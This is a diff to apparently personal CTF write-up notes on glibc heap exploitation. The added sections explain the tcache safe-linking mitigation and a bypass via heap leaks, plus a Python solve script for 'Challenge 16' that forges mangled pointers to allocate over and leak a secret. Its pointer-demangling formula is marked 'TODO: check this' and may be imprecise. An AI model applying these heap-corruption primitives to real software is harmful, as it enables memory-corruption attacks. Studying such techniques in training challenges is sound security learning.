@@ -157,6 +157,27 @@ Very simple, very powerful. Can be triggered easily in case we obtain a somewhat
 Sometimes the program won't contain direct `malloc` calls. In such cases, we can use `printf, scanf` and others, which uses `malloc` internally. \
 Upon debugging, we usually won't like this functionality of `printf`. We can disable it via `setbuf(stdout, NULL)`. 
 
+### Tcache Safe Linking
+
+Corruption of the `next` pointer is very valuable, and can easily yield arbitrary write primitive. The introduced mitigation mangles the `next` pointer, by XORing it with a random value within freed chunks. \
+In addition to mangling `next` ptrs of freed chunks, demangled pointers least-significant nibble is **enforced** to be `0x0`. \
+Interestingly, the random value used by `PROTECT_PTR, REVEAL_PTR` is a shift of the position of the pointer - meaning `&ptr >> 12` (the first 3 nibbles are offset to a page, hence aren't affected by ASLR. We do want the result to be randomized, tho). \
+This also means that due to ASLR, every time the program runs, the random key would be altered!
+
+Within `malloc` implementation, `tcache_get` uses `REVEAL_PTR` as it needs to decrypt `e->next` and return its value. \
+Interesntingly, in order to resolve bins heads, inside the `tcache_perthread_struct` there are only **demangled pointers**. \
+Within `free`, `tcache_put` mangles the `next` pointer via `PROTECT_PTR`. 
+
+#### Bypass Technique
+
+Recall `PROTECT_PTR` is a reversible operation. We need 2 values - `pos` and `ptr`. \
+However, `REVEAL_PTR` is fully reversible from obfuscated pointer alone, as it uses `pos == &ptr`. Since all of this occurs within the heap, it is likely that `ptr >> 12` is roughly equivalent to `pos` itself (incase the `ptr` resides within the first page of the heap, it equals). This means that `REVEAL_PTR` is usually reversible from the mangled value, alone. \
+This means we can take a mangled value, and get back a valid heap pointer. Notice that the reason behind this, is because we assume the region where the pointer exists is identical to the pointed address region (because `next` ptr resides within a chunk on the heap, and points to another chunk on the heap). This trick wouldn't work, in case the pointer wouldv'e been stored in a different memory region than the pointed object. 
+
+Getting back to `PROTECT_PTR`, since we can actually retrieve `pos` out of a mangled pointer, this IS a reversible operation. This means that upon retrieving a mangled pointer value (any within the heap), we gain the primitive of forging a mangled pointer out of a valid pointer we own (re-mangle things before overwriting `next` ptrs). 
+
+TL;DR - in case we have heap leak primitive, we can easily defeat this mitigation. 
+
 ## Challenge 1
 
 I've set `pwndbg` environment for all challenges from now on. Its heap commands documentation can be found [here][pwndbg-docs].
@@ -806,7 +827,7 @@ My current goal is to fake the `next` member of some chunk, in order to leverage
 
 Notice that because the `read` can only read up to 127 bytes, we wouldn't like to deal with large chunks, as they would require larger paddings. 
 
-An interesting caveat I've encountered, was when the overwritten chunk was the head of the tcachebin, but there were no other chunks in it (meaning, its `next` was `NULL`, and the amount of total chunks within the bin was `1`). Because of the allocation at `step 3`, size of that bin was decreased to `0`. A libc optimization looks at the size of the bin within the `tcache_perthread_struct` before actually referencing the bin. In case it is `0`, it won't even access the `next` pointer. Hence, my exploit didn't work before adding the allocation of `slot[2]`. 
+An interesting caveat I've encountered, was when the overwritten chunk was the head of the tcachebin, but there were no other chunks in it (meaning, its `next` was `NULL`, and the amount of total chunks within the bin was `1`). Because of the allocation at `step 3`, size of that bin was decreased to `0`. A libc optimization looks at the size of the bin within the `tcache_perthread_struct` before actually referencing the bin. In case it is `0`, it won't even access the `next` pointer. Hence, my exploit didn't work before adding the allocation and freeing of `slot[2]`. 
 
 ```python
 def read(p, index, size, buf):
@@ -857,7 +878,145 @@ def exploit():
 
 ## Challenge 16
 
-First safe-linking challenge.
+First safe-linking challenge. Now we're provided with `libc` and `ld` the binary uses. \
+The challenge seems identical to challenge 9, but this time with safe linking. Recall my solution approach there - instead of "leaking" the secret, I've actually aimed to nullify its value. \
+To do this, I've overwritten the `next` ptr of a tcache within a bin, forcing the allocation to be performed from an address of my wish. 
+
+At this level, we can easily leak a mangled `next` ptr of a chunk - by simply calling `puts` on a freed chunk. \
+In order to demangle it, recall the mangling formula:
+
+```c
+(&ptr >> 12) ^ ptr
+```
+
+In our case, the `ptr` is the `next` pointer value, while `&ptr` is its address - hence the chunk address. Both of them are heap addresses, hence we can bypass this mangling. \
+Also recall that the rightmost nibble of a valid `next` is always `0`.
+
+The `ptr_size` is the actual size of the pointer until null is found - for example, `0x00414243` has size of `24` bits. 
+
+```c
+key = (mangled_ptr >> (ptr_size - 12)) << 4 + (mangled_ptr & 0x000000000000000f)
+ptr = mangled_ptr ^ key
+```
+
+This also means that if we make sure all allocations are being performed within the same heap pages, they would all use **the exact same mangling key**. \
+Hence, once obtaining a mangled pointer (that resides within the same page as the chunk it points to), we can forge arbitrary mangled next pointers within the same page. 
+
+Once having the option to mangle and demangle pointers, my current goal is as challenge 9 - to nullify all 16 bytes of the secret. \
+However, notice the secret resides on `0x10` aligned address. The `p->key = 0` trick would only work for the second qword, and because now we can no longer allocate chunks that aren't aligned to `0x10`, we won't be able to nullify the first qword of the secret. \
+This made me thinking of a bit different approach. We already have arbitrary-alloc-at-goal-address primitive, and we have the goal address. The only problem is that upon `malloc` invocation, a boundary check is being made, and nullifies the corresponding slot, hence making this pointer inaccessible by `puts` call. \
+But recall the current state of the allocated `secret` chunk. Its first qword are completely random 8 bytes (`next`), and the `key` is `NULL`. If we would trick the allocator, so that `next` would be overwritten, we can optionally brute force much less amount of bytes. Even better - if we obtain heap leakage, we may have no need to brute force at all. \
+This means we can solve this by calling `free` on the secret-allocated chunk. However, it doesn't seem we have any option to do so, as there's no state where any of the slots may contain a non-heap pointer. 
+
+Another finding, is that `scanf` handler isn't trivial. Notice it performs the write because on the amount returned by `malloc_usable_size`. Under the hood, this method just parses the `size` member of the chunk. This means that if we would overwrite this member, we can actually obtain a forward heap overflow primitive. Can be very useful, as we are able to perform allocations to the start of `secret` and write towards them:
+
+```c
+static size_t
+musable (void *mem)
+{
+  mchunkptr p;
+  if (mem != 0)
+    {
+      p = mem2chunk (mem);
+      ...
+      else if (inuse (p))
+        return chunksize (p) - SIZE_SZ;
+    }
+  return 0;
+}
+
+/* extract p's inuse bit */
+#define inuse(p)							      \
+  ((((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size) & PREV_INUSE)
+```
+
+This means that if we would corrupt the size of the chunk that contains `secret` as its `next` ptr, making sure the "next fake chunk" contains its `PREV_INUSE` set, we would be able to fool the allocator, obtaining the option to linearly write into the large allocated `secret` address. \
+However, this approach won't work (maybe unless we would wrap around the VA space), as the boundary check properly validates the allocation is above `secret + 0x10000`, where the real secret is actually located at `secret + 0x9a10`. 
+
+Another approach is overwriting `tcache_perthread_struct`. \
+Recall it actually resides within the start of the heap, meaning at the start of our chunk's page. Hence, we can easily resolve its addresses, and overwrite it to our wish. In particular, we can artbitrarly read and write its content. 
+
+Lets say we would overwrite some tcachebin head to our target address. In that case, upon calling `free` on another chunk, the target address would be written as the `next` of the recently freed chunk. \ The thing is, upon an allocation of our secret, if it was the head of the tcachebin, the new tcachebin head would actually be filled with the **first** 8 bytes of the secret! \
+This means that upon an allocation of the fake chunk, in addition to nullifying the second qword of the target address, it actually leaks its first 8 bytes into the tcache perthread struct! By allocating another fake chunk right at the tcache perthread struct, we can easily leak the 8 bytes value. 
+
+Lastly, notice that the 3 lsbs of the first qword of the secret, stored within the `tcache_perthread_struct` are actually being overwritten for some reason. By reading `tcache_get_n` for glibc-2.40, I've noted the following:
+
+```c
+if (ep == &(tcache->entries[tc_idx]))
+      *ep = REVEAL_PTR (e->next);
+  else
+    *ep = PROTECT_PTR (ep, REVEAL_PTR (e->next));
+```
+
+This means that upon malloc, in addition to writing the `next` ptr of the chunk into the tcache perthread struct, it also either protects or reveals it! This means that upon targeting the secret, located at `0x439a10`, the actual value that would be stored within the tcachebin head is `(*0x439a10) ^ 0x439`. Funny impact of safe-linking. 
+
+```python
+def new_allocate_chunk_at_addr(p, addr, size, key):
+    '''
+    Allocates chunk at specified addr, taking safe-linking into account. 
+    The result is accessible within slot[3]
+    '''
+    assert((addr & 0xf) == 0)
+
+    buf = struct.pack('<Q', addr ^ key)
+    malloc(p, 0, size)
+    malloc(p, 1, size)
+    free(p, 1)
+    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
+    scanf(p, 0, buf)  # Overwrite its next pointer to our addr
+    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
+    malloc(p, 3, size)  # Now the chunk is allocated on the addr, which address is stored on slot 3!
+
+    return
+
+def demangle_ptr(mangled_ptr):
+    ptr_size = len(mangled_ptr)
+    mangled_value = mangled_ptr + b'\x00' * (8 - ptr_size)
+    mangled_value = struct.unpack('<Q', mangled_value)[0]
+    ptr_size_in_bits = (len(hex(mangled_value)) - len('0x')) * 4
+    # key = (mangled_value >> (ptr_size_in_bits - 12)) << 4
+    key = (mangled_value >> 16) << 4  # TODO: check this
+    key += (mangled_value & 0x000000000000000f)
+    ptr = mangled_value ^ key
+
+    return ptr, key
+
+def exploit():    
+    p.recvuntil(b'quit): ')
+
+    secret_addr = 0x439a10
+    print(f'secret_addr: {hex(secret_addr)}')
+
+    chunk_size = 0x20  # Arbitrary size
+    malloc(p, 0, chunk_size)
+    malloc(p, 1, chunk_size)
+    free(p, 1)
+    free(p, 0)
+    mangled_next_ptr = puts(p, 0)
+    demangled_ptr, key = demangle_ptr(mangled_next_ptr)
+    tcachebin_head_0x30 = (demangled_ptr & 0xfffffffffffff000) + 0xa0
+    print(f'mangled_next_ptr: {mangled_next_ptr} demangled_ptr: {hex(demangled_ptr)} tcachebin_head_0x30: {hex(tcachebin_head_0x30)} key: {hex(key)}')
+    
+    
+    # Arbtirary sizes, but don't collied with other tcachebin
+    chunk_size_2 = chunk_size + 0x10
+    new_allocate_chunk_at_addr(p, secret_addr, chunk_size_2, key)  # Nullify second qword of the flag, by allocating a fake chunk into it
+    # A side effect of the above allocation, is having the first qword of the flag stored into the tcachebin head, of bin correponding to chunk_size_2. 
+    # Allocate another chunk right there, so that we would be able to leak the value
+    
+    chunk_size_3 = chunk_size + 0x50
+    new_allocate_chunk_at_addr(p, tcachebin_head_0x30, chunk_size_3, key)
+
+    protected_secret_qword = puts(p, 3)
+    secret_qword = struct.unpack('<Q', protected_secret_qword)[0] ^ (secret_addr >> 12)
+    print(f'first_secret_qword_revealed: {hex(secret_qword)}')
+    my_secret = struct.pack('<Q', secret_qword) + b'\x00' * 8
+    send_flag(p, my_secret)
+
+    p.interactive()
+```
+
+## Challenge 17
 
 
 
